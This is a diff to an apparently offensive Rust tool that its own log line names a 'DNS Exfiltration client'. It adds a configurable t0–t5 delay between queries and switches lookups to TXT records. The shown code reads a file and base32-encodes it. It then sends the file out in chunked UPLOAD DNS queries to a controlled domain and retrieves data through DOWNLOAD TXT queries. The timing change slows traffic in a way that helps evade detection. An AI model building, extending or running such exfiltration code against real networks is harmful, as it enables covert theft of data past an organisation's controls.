@@ -34,6 +34,9 @@ struct CommonArgs {
 
     #[arg(short, long, default_value = "4")]
     threads: usize,
+
+    #[arg(short, long, default_value = "t3")]
+    speed: String, // t0 (super lent) à t5 (super rapide)
 }
 
 #[derive(Subcommand, Debug)]
@@ -44,18 +47,35 @@ enum Commands {
     Receive(CommonArgs),
 }
 
+fn speed_to_delay(speed: &str) -> tokio::time::Duration {
+    match speed {
+        "t0" => tokio::time::Duration::from_millis(500), // Super lent
+        "t1" => tokio::time::Duration::from_millis(300),
+        "t2" => tokio::time::Duration::from_millis(200),
+        "t3" => tokio::time::Duration::from_millis(100),
+        "t4" => tokio::time::Duration::from_millis(50),
+        "t5" => tokio::time::Duration::from_millis(10),  // Super rapide
+        _ => {
+            error!("Invalid speed value. Defaulting to t3.");
+            tokio::time::Duration::from_millis(100)
+        }
+    }
+}
+
+
 #[tokio::main]
 async fn main() {
     SimpleLogger::new().init().unwrap();
     let args = Args::parse();
     let resolver = get_resolver();
-
+    
     info!("Starting DNS Exfiltration client");
 
     match args.command {
         Commands::Send(common_args) => {
             match fs::read(&common_args.filename) {
             Ok(raw_bytes) => {
+                let delay = speed_to_delay(&common_args.speed);
                 info!("File {} exists and is readable", &common_args.filename);
                 let labels = split_data_into_label_chunks(&raw_bytes);
                 let encoded_labels = encode_base32(labels);
@@ -90,7 +110,7 @@ async fn main() {
                             let mut attempts = 0;
                             
                             loop {
-                                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                                tokio::time::sleep(delay).await;
                                 let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, index, total_labels, code, domain);
                         
                                 match resolver.lookup(&query, get_random_record_type()).await {
@@ -135,9 +155,9 @@ async fn main() {
                     return;
                 }
             };
-
+            let delay = speed_to_delay(&common_args.speed);
             let query = format!("DOWNLOAD.{}.{}", common_args.code, common_args.domain);
-            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;
+            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await;
 
             let total_fragments: usize = match response {
                 Ok(lookup) => {
@@ -186,9 +206,9 @@ async fn main() {
                         let mut attempts = 0;
                         while attempts < MAX_ATTEMPTS {
                             let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
-                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                            tokio::time::sleep(delay).await;
 
-                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
+                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await {
                                 Ok(lookup) => {
                                     let records = lookup.iter().collect::<Vec<_>>();
                                     let record_data = records[0].to_string();
